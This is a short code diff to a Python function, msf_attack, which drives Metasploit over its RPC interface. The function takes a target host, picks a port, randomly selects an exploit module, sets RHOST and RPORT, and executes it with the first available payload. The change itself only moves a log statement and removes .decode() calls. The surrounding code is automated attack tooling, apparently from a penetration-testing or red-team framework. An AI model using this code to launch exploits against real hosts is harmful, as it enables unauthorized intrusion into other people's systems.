@@ -95,8 +95,8 @@ def msf_attack(host: str, *args, **kwargs):
             port = p['port']
             break
     exploit = random.choice(msf_search(client, query))
-    MSF.log("Using exploit {} against {}:{}".format(exploit.modulename.decode(), host, port))
     exploit = client.modules.use('exploit', exploit)
+    MSF.log("Using exploit {} against {}:{}".format(exploit.modulename, host, port))
     for r in exploit.required:
         if r == b'RHOST':
             exploit['RHOST'.encode()] = host
@@ -104,4 +104,4 @@ def msf_attack(host: str, *args, **kwargs):
             exploit['RPORT'.encode()] = port
     # TODO: Payloads?
     e = exploit.execute(payload=exploit.payloads[0].decode())
-    MSF.log('Exploit ' + exploit.modulename.decode() + ' against ' + host + ' launched.', 'success')
+    MSF.log('Exploit ' + exploit.modulename + ' against ' + host + ' launched.', 'success')
